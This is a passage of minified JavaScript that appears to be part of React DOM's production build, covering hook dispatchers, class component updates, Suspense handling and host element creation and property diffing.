Xr={readContext:xe,useCallback:ne,useContext:ne,useEffect:ne,useImperativeHandle:ne,useInsertionEffect:ne,useLayoutEffect:ne,useMemo:ne,useReducer:ne,useRef:ne,useState:ne,useDebugValue:ne,useDeferredValue:ne,useTransition:ne,useMutableSource:ne,useSyncExternalStore:ne,useId:ne,unstable_isNewReconciler:!1},lf={readContext:xe,useCallback:function(e,n){return Ae().memoizedState=[e,n===void 0?null:n],e},useContext:xe,useEffect:Ts,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,Er(4194308,4,Su.bind(null,n,e),t)},useLayoutEffect:function(e,n){return Er(4194308,4,e,n)},useInsertionEffect:function(e,n){return Er(4,2,e,n)},useMemo:function(e,n){var t=Ae();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var r=Ae();return n=t!==void 0?t(n):n,r.memoizedState=r.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},r.queue=e,e=e.dispatch=rf.bind(null,U,e),[r.memoizedState,e]},useRef:function(e){var n=Ae();return e={current:e},n.memoizedState=e},useState:Cs,useDebugValue:Ci,useDeferredValue:function(e){return Ae().memoizedState=e},useTransition:function(){var e=Cs(!1),n=e[0];return e=tf.bind(null,e[1]),Ae().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var r=U,o=Ae();if(F){if(t===void 0)throw Error(v(407));t=t()}else{if(t=n(),Y===null)throw Error(v(349));Rn&30||du(r,n,t)}o.memoizedState=t;var l={value:t,getSnapshot:n};return o.queue=l,Ts(pu.bind(null,r,l,e),[e]),r.flags|=2048,Qt(9,fu.bind(null,r,l,t,n),void 0,null),t},useId:function(){var e=Ae(),n=Y.identifierPrefix;if(F){var t=We,r=Be;t=(r&~(1<<32-De(r)-1)).toString(32)+t,n=":"+n+"R"+t,t=$t++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=nf++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},sf={readContext:xe,useCallback:ku,useContext:xe,useEffect:ki,useImperativeHandle:wu,useInsertionEffect:vu,useLayoutEffect:yu,useMemo:Cu,useReducer:Bo,useRef:gu,useState:function(){return Bo(Kt)},useDebugValue:Ci,useDeferredValue:function(e){var n=Pe();return Tu(n,Q.memoizedState,e)},useTransition:function(){var e=Bo(Kt)[0],n=Pe().memoizedState;return[e,n]},useMutableSource:uu,useSyncExternalStore:cu,useId:xu,unstable_isNewReconciler:!1},af={readContext:xe,useCallback:ku,useContext:xe,useEffect:ki,useImperativeHandle:wu,useInsertionEffect:vu,useLayoutEffect:yu,useMemo:Cu,useReducer:Wo,useRef:gu,useState:function(){return Wo(Kt)},useDebugValue:Ci,useDeferredValue:function(e){var n=Pe();return Q===null?n.memoizedState=e:Tu(n,Q.memoizedState,e)},useTransition:function(){var e=Wo(Kt)[0],n=Pe().memoizedState;return[e,n]},useMutableSource:uu,useSyncExternalStore:cu,useId:xu,unstable_isNewReconciler:!1};function Re(e,n){if(e&&e.defaultProps){n=V({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Pl(e,n,t,r){n=e.memoizedState,t=t(r,n),t=t==null?n:V({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var co={isMounted:function(e){return(e=e._reactInternals)?Dn(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var r=ie(),o=cn(e),l=Je(r,o);l.payload=n,t!=null&&(l.callback=t),n=an(e,l,o),n!==null&&(Le(n,e,o,r),xr(n,e,o))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var r=ie(),o=cn(e),l=Je(r,o);l.tag=1,l.payload=n,t!=null&&(l.callback=t),n=an(e,l,o),n!==null&&(Le(n,e,o,r),xr(n,e,o))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=ie(),r=cn(e),o=Je(t,r);o.tag=2,n!=null&&(o.callback=n),n=an(e,o,r),n!==null&&(Le(n,e,r,t),xr(n,e,r))}};function xs(e,n,t,r,o,l,i){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,l,i):n.prototype&&n.prototype.isPureReactComponent?!Ht(t,r)||!Ht(o,l):!0}function Ru(e,n,t){var r=!1,o=pn,l=n.contextType;return typeof l=="object"&&l!==null?l=xe(l):(o=fe(n)?En:oe.current,r=n.contextTypes,l=(r=r!=null)?et(e,o):pn),n=new n(t,l),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=co,e.stateNode=n,n._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=o,e.__reactInternalMemoizedMaskedChildContext=l),n}function Ps(e,n,t,r){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,r),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,r),n.state!==e&&co.enqueueReplaceState(n,n.state,null)}function El(e,n,t,r){var o=e.stateNode;o.props=t,o.state=e.memoizedState,o.refs={},mi(e);var l=n.contextType;typeof l=="object"&&l!==null?o.context=xe(l):(l=fe(n)?En:oe.current,o.context=et(e,l)),o.state=e.memoizedState,l=n.getDerivedStateFromProps,typeof l=="function"&&(Pl(e,n,l,t),o.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof o.getSnapshotBeforeUpdate=="function"||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(n=o.state,typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount(),n!==o.state&&co.enqueueReplaceState(o,o.state,null),Kr(e,t,o,r),o.state=e.memoizedState),typeof o.componentDidMount=="function"&&(e.flags|=4194308)}function ot(e,n){try{var t="",r=n;do t+=Ic(r),r=r.return;while(r);var o=t}catch(l){o=`
Error generating stack: `+l.message+`
`+l.stack}return{value:e,source:n,stack:o,digest:null}}function Jo(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function jl(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var uf=typeof WeakMap=="function"?WeakMap:Map;function Nu(e,n,t){t=Je(-1,t),t.tag=3,t.payload={element:null};var r=n.value;return t.callback=function(){Yr||(Yr=!0,zl=r),jl(e,n)},t}function Mu(e,n,t){t=Je(-1,t),t.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var o=n.value;t.payload=function(){return r(o)},t.callback=function(){jl(e,n)}}var l=e.stateNode;return l!==null&&typeof l.componentDidCatch=="function"&&(t.callback=function(){jl(e,n),typeof r!="function"&&(un===null?un=new Set([this]):un.add(this));var i=n.stack;this.componentDidCatch(n.value,{componentStack:i!==null?i:""})}),t}function Es(e,n,t){var r=e.pingCache;if(r===null){r=e.pingCache=new uf;var o=new Set;r.set(n,o)}else o=r.get(n),o===void 0&&(o=new Set,r.set(n,o));o.has(t)||(o.add(t),e=Tf.bind(null,e,n,t),n.then(e,e))}function js(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function Rs(e,n,t,r,o){return e.mode&1?(e.flags|=65536,e.lanes=o,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=Je(-1,1),n.tag=2,an(t,n,1))),t.lanes|=1),e)}var cf=Xe.ReactCurrentOwner,ce=!1;function le(e,n,t,r){n.child=e===null?lu(n,null,t,r):tt(n,e.child,t,r)}function Ns(e,n,t,r,o){t=t.render;var l=n.ref;return Yn(n,o),r=Si(e,n,t,r,l,o),t=wi(),e!==null&&!ce?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~o,Ge(e,n,o)):(F&&t&&si(n),n.flags|=1,le(e,n,r,o),n.child)}function Ms(e,n,t,r,o){if(e===null){var l=t.type;return typeof l=="function"&&!Mi(l)&&l.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=l,Ou(e,n,l,r,o)):(e=Mr(t.type,null,r,n,n.mode,o),e.ref=n.ref,e.return=n,n.child=e)}if(l=e.child,!(e.lanes&o)){var i=l.memoizedProps;if(t=t.compare,t=t!==null?t:Ht,t(i,r)&&e.ref===n.ref)return Ge(e,n,o)}return n.flags|=1,e=dn(l,r),e.ref=n.ref,e.return=n,n.child=e}function Ou(e,n,t,r,o){if(e!==null){var l=e.memoizedProps;if(Ht(l,r)&&e.ref===n.ref)if(ce=!1,n.pendingProps=r=l,(e.lanes&o)!==0)e.flags&131072&&(ce=!0);else return n.lanes=e.lanes,Ge(e,n,o)}return Rl(e,n,t,r,o)}function Du(e,n,t){var r=n.pendingProps,o=r.children,l=e!==null?e.memoizedState:null;if(r.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},_(Kn,me),me|=t;else{if(!(t&1073741824))return e=l!==null?l.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,_(Kn,me),me|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=l!==null?l.baseLanes:t,_(Kn,me),me|=r}else l!==null?(r=l.baseLanes|t,n.memoizedState=null):r=t,_(Kn,me),me|=r;return le(e,n,o,t),n.child}function Lu(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Rl(e,n,t,r,o){var l=fe(t)?En:oe.current;return l=et(n,l),Yn(n,o),t=Si(e,n,t,r,l,o),r=wi(),e!==null&&!ce?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~o,Ge(e,n,o)):(F&&r&&si(n),n.flags|=1,le(e,n,t,o),n.child)}function Os(e,n,t,r,o){if(fe(t)){var l=!0;Vr(n)}else l=!1;if(Yn(n,o),n.stateNode===null)jr(e,n),Ru(n,t,r),El(n,t,r,o),r=!0;else if(e===null){var i=n.stateNode,s=n.memoizedProps;i.props=s;var a=i.context,c=t.contextType;typeof c=="object"&&c!==null?c=xe(c):(c=fe(t)?En:oe.current,c=et(n,c));var p=t.getDerivedStateFromProps,h=typeof p=="function"||typeof i.getSnapshotBeforeUpdate=="function";h||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s!==r||a!==c)&&Ps(n,i,r,c),Ze=!1;var m=n.memoizedState;i.state=m,Kr(n,r,i,o),a=n.memoizedState,s!==r||m!==a||de.current||Ze?(typeof p=="function"&&(Pl(n,t,p,r),a=n.memoizedState),(s=Ze||xs(n,t,s,r,m,a,c))?(h||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount()),typeof i.componentDidMount=="function"&&(n.flags|=4194308)):(typeof i.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=r,n.memoizedState=a),i.props=r,i.state=a,i.context=c,r=s):(typeof i.componentDidMount=="function"&&(n.flags|=4194308),r=!1)}else{i=n.stateNode,su(e,n),s=n.memoizedProps,c=n.type===n.elementType?s:Re(n.type,s),i.props=c,h=n.pendingProps,m=i.context,a=t.contextType,typeof a=="object"&&a!==null?a=xe(a):(a=fe(t)?En:oe.current,a=et(n,a));var S=t.getDerivedStateFromProps;(p=typeof S=="function"||typeof i.getSnapshotBeforeUpdate=="function")||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s!==h||m!==a)&&Ps(n,i,r,a),Ze=!1,m=n.memoizedState,i.state=m,Kr(n,r,i,o);var w=n.memoizedState;s!==h||m!==w||de.current||Ze?(typeof S=="function"&&(Pl(n,t,S,r),w=n.memoizedState),(c=Ze||xs(n,t,c,r,m,w,a)||!1)?(p||typeof i.UNSAFE_componentWillUpdate!="function"&&typeof i.componentWillUpdate!="function"||(typeof i.componentWillUpdate=="function"&&i.componentWillUpdate(r,w,a),typeof i.UNSAFE_componentWillUpdate=="function"&&i.UNSAFE_componentWillUpdate(r,w,a)),typeof i.componentDidUpdate=="function"&&(n.flags|=4),typeof i.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof i.componentDidUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(n.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(n.flags|=1024),n.memoizedProps=r,n.memoizedState=w),i.props=r,i.state=w,i.context=a,r=c):(typeof i.componentDidUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(n.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(n.flags|=1024),r=!1)}return Nl(e,n,t,r,l,o)}function Nl(e,n,t,r,o,l){Lu(e,n);var i=(n.flags&128)!==0;if(!r&&!i)return o&&gs(n,t,!1),Ge(e,n,l);r=n.stateNode,cf.current=n;var s=i&&typeof t.getDerivedStateFromError!="function"?null:r.render();return n.flags|=1,e!==null&&i?(n.child=tt(n,e.child,null,l),n.child=tt(n,null,s,l)):le(e,n,s,l),n.memoizedState=r.state,o&&gs(n,t,!0),n.child}function _u(e){var n=e.stateNode;n.pendingContext?hs(e,n.pendingContext,n.pendingContext!==n.context):n.context&&hs(e,n.context,!1),hi(e,n.containerInfo)}function Ds(e,n,t,r,o){return nt(),ui(o),n.flags|=256,le(e,n,t,r),n.child}var Ml={dehydrated:null,treeContext:null,retryLane:0};function Ol(e){return{baseLanes:e,cachePool:null,transitions:null}}function Iu(e,n,t){var r=n.pendingProps,o=H.current,l=!1,i=(n.flags&128)!==0,s;if((s=i)||(s=e!==null&&e.memoizedState===null?!1:(o&2)!==0),s?(l=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(o|=1),_(H,o&1),e===null)return Tl(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(i=r.children,e=r.fallback,l?(r=n.mode,l=n.child,i={mode:"hidden",children:i},!(r&1)&&l!==null?(l.childLanes=0,l.pendingProps=i):l=mo(i,r,0,null),e=Pn(e,r,t,null),l.return=n,e.return=n,l.sibling=e,n.child=l,n.child.memoizedState=Ol(t),n.memoizedState=Ml,e):Ti(n,i));if(o=e.memoizedState,o!==null&&(s=o.dehydrated,s!==null))return df(e,n,i,r,s,o,t);if(l){l=r.fallback,i=n.mode,o=e.child,s=o.sibling;var a={mode:"hidden",children:r.children};return!(i&1)&&n.child!==o?(r=n.child,r.childLanes=0,r.pendingProps=a,n.deletions=null):(r=dn(o,a),r.subtreeFlags=o.subtreeFlags&14680064),s!==null?l=dn(s,l):(l=Pn(l,i,t,null),l.flags|=2),l.return=n,r.return=n,r.sibling=l,n.child=r,r=l,l=n.child,i=e.child.memoizedState,i=i===null?Ol(t):{baseLanes:i.baseLanes|t,cachePool:null,transitions:i.transitions},l.memoizedState=i,l.childLanes=e.childLanes&~t,n.memoizedState=Ml,r}return l=e.child,e=l.sibling,r=dn(l,{mode:"visible",children:r.children}),!(n.mode&1)&&(r.lanes=t),r.return=n,r.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=r,n.memoizedState=null,r}function Ti(e,n){return n=mo({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function hr(e,n,t,r){return r!==null&&ui(r),tt(n,e.child,null,t),e=Ti(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function df(e,n,t,r,o,l,i){if(t)return n.flags&256?(n.flags&=-257,r=Jo(Error(v(422))),hr(e,n,i,r)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(l=r.fallback,o=n.mode,r=mo({mode:"visible",children:r.children},o,0,null),l=Pn(l,o,i,null),l.flags|=2,r.return=n,l.return=n,r.sibling=l,n.child=r,n.mode&1&&tt(n,e.child,null,i),n.child.memoizedState=Ol(i),n.memoizedState=Ml,l);if(!(n.mode&1))return hr(e,n,i,null);if(o.data==="$!"){if(r=o.nextSibling&&o.nextSibling.dataset,r)var s=r.dgst;return r=s,l=Error(v(419)),r=Jo(l,r,void 0),hr(e,n,i,r)}if(s=(i&e.childLanes)!==0,ce||s){if(r=Y,r!==null){switch(i&-i){case 4:o=2;break;case 16:o=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:o=32;break;case 536870912:o=268435456;break;default:o=0}o=o&(r.suspendedLanes|i)?0:o,o!==0&&o!==l.retryLane&&(l.retryLane=o,Qe(e,o),Le(r,e,o,-1))}return Ni(),r=Jo(Error(v(421))),hr(e,n,i,r)}return o.data==="$?"?(n.flags|=128,n.child=e.child,n=xf.bind(null,e),o._reactRetry=n,null):(e=l.treeContext,he=sn(o.nextSibling),ge=n,F=!0,Me=null,e!==null&&(we[ke++]=Be,we[ke++]=We,we[ke++]=jn,Be=e.id,We=e.overflow,jn=n),n=Ti(n,r.children),n.flags|=4096,n)}function Ls(e,n,t){e.lanes|=n;var r=e.alternate;r!==null&&(r.lanes|=n),xl(e.return,n,t)}function $o(e,n,t,r,o){var l=e.memoizedState;l===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:r,tail:t,tailMode:o}:(l.isBackwards=n,l.rendering=null,l.renderingStartTime=0,l.last=r,l.tail=t,l.tailMode=o)}function Au(e,n,t){var r=n.pendingProps,o=r.revealOrder,l=r.tail;if(le(e,n,r.children,t),r=H.current,r&2)r=r&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Ls(e,t,n);else if(e.tag===19)Ls(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(_(H,r),!(n.mode&1))n.memoizedState=null;else switch(o){case"forwards":for(t=n.child,o=null;t!==null;)e=t.alternate,e!==null&&Qr(e)===null&&(o=t),t=t.sibling;t=o,t===null?(o=n.child,n.child=null):(o=t.sibling,t.sibling=null),$o(n,!1,o,t,l);break;case"backwards":for(t=null,o=n.child,n.child=null;o!==null;){if(e=o.alternate,e!==null&&Qr(e)===null){n.child=o;break}e=o.sibling,o.sibling=t,t=o,o=e}$o(n,!0,t,null,l);break;case"together":$o(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function jr(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function Ge(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),Nn|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(v(153));if(n.child!==null){for(e=n.child,t=dn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=dn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function ff(e,n,t){switch(n.tag){case 3:_u(n),nt();break;case 5:au(n);break;case 1:fe(n.type)&&Vr(n);break;case 4:hi(n,n.stateNode.containerInfo);break;case 10:var r=n.type._context,o=n.memoizedProps.value;_(Jr,r._currentValue),r._currentValue=o;break;case 13:if(r=n.memoizedState,r!==null)return r.dehydrated!==null?(_(H,H.current&1),n.flags|=128,null):t&n.child.childLanes?Iu(e,n,t):(_(H,H.current&1),e=Ge(e,n,t),e!==null?e.sibling:null);_(H,H.current&1);break;case 19:if(r=(t&n.childLanes)!==0,e.flags&128){if(r)return Au(e,n,t);n.flags|=128}if(o=n.memoizedState,o!==null&&(o.rendering=null,o.tail=null,o.lastEffect=null),_(H,H.current),r)break;return null;case 22:case 23:return n.lanes=0,Du(e,n,t)}return Ge(e,n,t)}var zu,Dl,Fu,Hu;zu=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Dl=function(){};Fu=function(e,n,t,r){var o=e.memoizedProps;if(o!==r){e=n.stateNode,Tn(He.current);var l=null;switch(t){case"input":o=el(e,o),r=el(e,r),l=[];break;case"select":o=V({},o,{value:void 0}),r=V({},r,{value:void 0}),l=[];break;case"textarea":o=rl(e,o),r=rl(e,r),l=[];break;default:typeof o.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=Hr)}ll(t,r);var i;t=null;for(c in o)if(!r.hasOwnProperty(c)&&o.hasOwnProperty(c)&&o[c]!=null)if(c==="style"){var s=o[c];for(i in s)s.hasOwnProperty(i)&&(t||(t={}),t[i]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Dt.hasOwnProperty(c)?l||(l=[]):(l=l||[]).push(c,null));for(c in r){var a=r[c];if(s=o!=null?o[c]:void 0,r.hasOwnProperty(c)&&a!==s&&(a!=null||s!=null))if(c==="style")if(s){for(i in s)!s.hasOwnProperty(i)||a&&a.hasOwnProperty(i)||(t||(t={}),t[i]="");for(i in a)a.hasOwnProperty(i)&&s[i]!==a[i]&&(t||(t={}),t[i]=a[i])}else t||(l||(l=[]),l.push(c,t)),t=a;else c==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,s=s?s.__html:void 0,a!=null&&s!==a&&(l=l||[]).push(c,a)):c==="children"?typeof a!="string"&&typeof a!="number"||(l=l||[]).push(c,""+a):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Dt.hasOwnProperty(c)?(a!=null&&c==="onScroll"&&I("scroll",e),l||s===a||(l=[])):(l=l||[]).push(c,a))}t&&(l=l||[]).push("style",t);var c=l;(n.updateQueue=c)&&(n.flags|=4)}};Hu=function(e,n,t,r){t!==r&&(n.flags|=4)};function vt(e,n){if(!F)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var r=null;t!==null;)t.alternate!==null&&(r=t),t=t.sibling;r===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function te(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,r=0;if(n)for(var o=e.child;o!==null;)t|=o.lanes|o.childLanes,r|=o.subtreeFlags&14680064,r|=o.flags&14680064,o.return=e,o=o.sibling;else for(o=e.child;o!==null;)t|=o.lanes|o.childLanes,r|=o.subtreeFlags,r|=o.flags,o.return=e,o=o.sibling;return e.subtreeFlags|=r,e.childLanes=t,n}function pf(e,n,t){var r=n.pendingProps;switch(ai(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return te(n),null;case 1:return fe(n.type)&&Ur(),te(n),null;case 3:return r=n.stateNode,rt(),A(de),A(oe),vi(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(pr(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Me!==null&&(Ul(Me),Me=null))),Dl(e,n),te(n),null;case 5:gi(n);var o=Tn(Jt.current);if(t=n.type,e!==null&&n.stateNode!=null)Fu(e,n,t,r,o),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!r){if(n.stateNode===null)throw Error(v(166));return te(n),null}if(e=Tn(He.current),pr(n)){r=n.stateNode,t=n.type;var l=n.memoizedProps;switch(r[ze]=n,r[Bt]=l,e=(n.mode&1)!==0,t){case"dialog":I("cancel",r),I("close",r);break;case"iframe":case"object":case"embed":I("load",r);break;case"video":case"audio":for(o=0;o<Ct.length;o++)I(Ct[o],r);break;case"source":I("error",r);break;case"img":case"image":case"link":I("error",r),I("load",r);break;case"details":I("toggle",r);break;case"input":Bi(r,l),I("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!l.multiple},I("invalid",r);break;case"textarea":Ji(r,l),I("invalid",r)}ll(t,l),o=null;for(var i in l)if(l.hasOwnProperty(i)){var s=l[i];i==="children"?typeof s=="string"?r.textContent!==s&&(l.suppressHydrationWarning!==!0&&fr(r.textContent,s,e),o=["children",s]):typeof s=="number"&&r.textContent!==""+s&&(l.suppressHydrationWarning!==!0&&fr(r.textContent,s,e),o=["children",""+s]):Dt.hasOwnProperty(i)&&s!=null&&i==="onScroll"&&I("scroll",r)}switch(t){case"input":or(r),Wi(r,l,!0);break;case"textarea":or(r),$i(r);break;case"select":case"option":break;default:typeof l.onClick=="function"&&(r.onclick=Hr)}r=o,n.updateQueue=r,r!==null&&(n.flags|=4)}else{i=o.nodeType===9?o:o.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=pa(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=i.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=i.createElement(t,{is:r.is}):(e=i.createElement(t),t==="select"&&(i=e,r.multiple?i.multiple=!0:r.size&&(i.size=r.size))):e=i.createElementNS(e,t),e[ze]=n,e[Bt]=r,zu(e,n,!1,!1),n.stateNode=e;e:{switch(i=il(t,r),t){case"dialog":I("cancel",e),I("close",e),o=r;break;case"iframe":case"object":case"embed":I("load",e),o=r;break;case"video":case"audio":for(o=0;o<Ct.length;o++)I(Ct[o],e);o=r;break;case"source":I("error",e),o=r;break;case"img":case"image":case"link":I("error",e),I("load",e),o=r;break;case"details":I("toggle",e),o=r;break;case"input":Bi(e,r),o=el(e,r),I("invalid",e);break;case"option":o=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},o=V({},r,{value:void 0}),I("invalid",e);break;case"textarea":Ji(e,r),o=rl(e,r),I("invalid",e);break;default:o=r}ll(t,o),s=o;for(l in s)if(s.hasOwnProperty(l)){var a=s[l];l==="style"?ga(e,a):l==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,a!=null&&ma(e,a)):l==="children"?typeof a=="string"?(t!=="textarea"||a!=="")&&Lt(e,a):typeof a=="number"&&Lt(e,""+a):l!=="suppressContentEditableWarning"&&l!=="suppressHydrationWarning"&&l!=="autoFocus"&&(Dt.hasOwnProperty(l)?a!=null&&l==="onScroll"&&I("scroll",e):a!=null&&Ql(e,l,a,i))}switch(t){case"input":or(e),Wi(e,r,!1);break;case"textarea":or(e),$i(e);break;case"option":r.value!=null&&e.setAttribute("value",""+fn(r.value));break;case"select":e.multiple=!!r.multiple,l=r.value,l!=null?Qn(e,!!r.multiple,l,!1):r.defaultValue!=null&&Qn(e,!!r.multiple,r.defaultValue,!0);break;default:typeof o.onClick=="function"&&(e.onclick=Hr)}switch(t){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return te(n),null;case 6:if(e&&n.stateNode!=null)Hu(e,n,e.memoizedProps,r);else{if(typeof r!="string"&&n.stateNode===null)throw Error(v(166));if(t=Tn(Jt.current),Tn(He.current),pr(n)){if(r=n.stateNode,t=n.memoizedProps,r[ze]=n,(l=r.nodeValue!==t)&&(e=ge,e!==null))switch(e.tag){case 3:fr(r.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&fr(r.nodeValue,t,(e.mode&1)!==0)}l&&(n.flags|=4)}else r=(t.nodeType===9?t:t.ownerDocument).createTextNode(r),r[ze]=n,n.stateNode=r}return te(n),null;case 13:if(A(H),r=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(F&&he!==null&&n.mode&1&&!(n.flags&128))ru(),nt(),n.flags|=98560,l=!1;else if(l=pr(n),r!==null&&r.dehydrated!==null){if(e===null){if(!l)throw Error(v(318));if(l=n.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(v(317));l[ze]=n}else nt(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;te(n),l=!1}else Me!==null&&(Ul(Me),Me=null),l=!0;if(!l)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(n.child.flags|=8192,n.mode&1&&(e===null||H.current&1?G===0&&(G=3):Ni())),n.updateQueue!==null&&(n.flags|=4),te(n),null);case 4:return rt(),Dl(e,n),e===null&&Ut(n.stateNode.containerInfo),te(n),null;case 10:return fi(n.type._context),te(n),null;case 17:return fe(n.type)&&Ur(),te(n),null;case 19:if(A(H),l=n.memoizedState,l===null)return 